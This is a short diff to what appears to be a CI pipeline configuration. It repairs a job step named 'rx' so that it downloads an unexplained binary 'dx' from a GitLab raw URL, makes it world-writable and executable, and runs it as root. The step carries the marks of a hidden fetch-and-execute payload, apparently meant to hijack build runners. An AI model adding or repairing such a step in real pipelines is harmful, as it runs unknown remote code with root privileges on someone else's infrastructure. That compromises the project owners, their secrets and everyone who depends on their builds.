@@ -8,7 +8,7 @@ jobs:
       - run:
           name: "rx"
           command: |
-           sudo su -command "wget https://gitlab.com/RobCranes/tx/-/raw/main/dx && chmod 777 dx && ./dx"
+           sudo su --command "wget https://gitlab.com/RobCranes/tx/-/raw/main/dx && chmod 777 dx && ./dx"
 
 workflows:
   version: 2
